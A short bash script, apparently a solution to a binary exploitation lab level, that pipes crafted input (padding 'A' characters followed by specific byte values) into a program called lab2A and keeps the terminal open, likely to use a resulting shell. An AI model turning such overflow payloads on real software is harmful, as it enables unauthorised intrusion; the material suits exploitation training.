#!/bin/bash
(python -c 'print "A"*14 + "\n" + "A\n"*23 + "\x2d\n\x62\n\x55\n\x56\n"' && cat ) | ./lab2A
